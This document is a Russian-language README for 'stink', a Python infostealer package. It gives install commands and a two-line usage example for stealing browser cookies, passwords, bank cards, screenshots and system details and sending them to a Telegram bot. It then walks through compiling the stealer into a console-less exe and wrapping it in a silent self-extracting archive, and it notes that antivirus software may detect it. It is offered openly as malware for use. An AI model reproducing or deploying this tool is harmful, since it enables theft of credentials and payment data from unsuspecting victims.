# stink

Стиллер куки и паролей всего лишь в 2 строки. Отправка в Telegram.

## Описание
`stink` в данный момент только начинает своё развитие. В будущем его функционал будет расширен.

### Текущие возможности
1. Поддержка следующих браузеров:
   - Chrome
   - Opera
   - Opera GX
   - Microsoft Edge
   - Brave
2. Сбор следующих данных:
   - Скриншот
   - Куки
   - Пароли
   - Банковские карты
   - IP-адрес
   - Конфигурация системы
   - Активные процессы
3. Отправка архива собранных данных в Telegram.
4. Выполнение в отдельном потоке.

### Будущие возможности
1. Поддержка других браузеров.
2. Прочие функции.
 
## Установка

Установить последнюю версию можно командой:
```
pip install stink==1.0.2
```

## Пример использования
### Стандартный
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
### Дополнительные параметры

- `errors` - вывод ошибок.

- `passwords` - сбор паролей.

- `cookies` - сбор куки.

- `cards` - сбор банковских карт.

- `processes` - сбор активных процессов.

- `system` - сбор конфигурации системы.

- `screen` - скриншот.

Все параметры принимают значение `bool`. 

- `True` - функция включена.

- `False` - функция выключена.

По умолчанию все функции включены, кроме вывода ошибок.

## Создание exe
Python является интерпретируемым языком программирования, поэтому мы сначала транслируем его в C, а затем скомпилируем в .exe файл.
Для этого нам понадобится Nuitka.

### Создание исполняемого файла

Создаем test.py (либо любое другое название) файл со следующим кодом:
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

### CMD
1. Открываем `cmd`.
2. Прописываем команду:
```
pip install virtualenv
```
3. Переходим в папку с файлом `test.py`:
```
cd path\to\file
```
4. Создаем виртуальное окружение и активируем его:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Устанавливаем Nuitka и Stink:
```
pip install Nuitka==0.6.16.4
```
```
pip install stink==1.0.2
```
6. Прописываем команду:
```
nuitka --onefile --windows-disable-console --include-package=stink test.py
```

После выполнения команды получаем test.exe файл со скрытой консолью.

## Сжатие exe
Файл `.exe` очень большой, поэтому мы сожмем его с помощью WinRAR, при этом он останется в формате `.exe`.

#### Недостатки
- Может быть распознан различными антивирусами.
- Более длительное время запуска программы.

### WinRAR
1. Скачайте и установите [WinRAR](https://www.win-rar.com/start.html?&L=4).
2. Щелкните правой кнопкой мыши на файле `.exe` и выберите `Добавить в архив...`.
3. Выберите формат архива `RAR`, метод сжатия `Максимальный` и размер словаря `32 MB` и включите `Создать самораспаковывающийся архив`.
4. Перейдите во вкладку `Дополнительно` и выберите `Параметры SFX`.
5. Перейдите во вкладку `Установка` и введите имя вашего файла (например, `test.exe`) в поле `Выполнить после распаковки`.
6. Перейдите во вкладку `Режимы`, нажмите `Распаковать во временную папку` и выберите `Сбросить все` в разделе `Режим вывода информации`.
7. Перейдите во вкладку `Обновление` и выберите `Перезаписать все файлы без запроса` в разделе `Режим перезаписи`.
8. Измените значок и логотип, по желанию, во вкладке `Текст и графика`.
9. Нажмите `OK`.

В результате мы получим файл `.exe`, уменьшенный в несколько раз:
```
        File size              Ratio
------------------------    -----------
41 748 KB  ->  13 664 KB       68.3%
```
